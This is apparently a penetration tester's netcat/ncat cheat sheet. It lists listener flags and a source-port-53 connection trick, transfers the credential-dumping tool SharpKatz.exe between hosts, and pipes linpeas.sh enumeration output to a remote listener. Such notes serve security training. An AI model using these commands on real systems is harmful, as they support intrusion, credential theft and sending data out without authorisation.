#Netcat #Ncat #remoteaccess
- [Netcat](https://nmap.org/ncat/)

Flag Description

`-l`Listen mode, to wait for a connection to connect to us.|
`-v`Verbose mode, so that we know when we receive a connection.|
`-n`Disable DNS resolution and only connect from/to IPs, to speed up the connection.|
`-p 1234` Port number `netcat` is listening on, and the reverse connection should be sent to.|
--source-port 53 change source port
Start a listener
- `nc -lvnp 1234` **listener**, verbose, no DNS, port

Make connections
- `ncat -nv --source-port 53 10.129.2.28 50000` # no dns, verbose, use source port 53 to target IP and port
- `nc -q 0 192.168.49.128 8000 < SharpKatz.exe` send contents of a file over netcat
- `ncat --send-only 192.168.49.128 8000 < SharpKatz.exe` send contents of a file over netcat then close connection
- `nc -l -p 8000 > SharpKatz.exe` send incoming data into a file, incoming data can be manual input, a file, or output from a script
- `ncat -l -p 8000 --recv-only > SharpKatz.exe` send incoming data into a file then close connection    ```
- `linpeas.sh | nc 10.10.16.5 9005` send output of a script directly into a nc pipe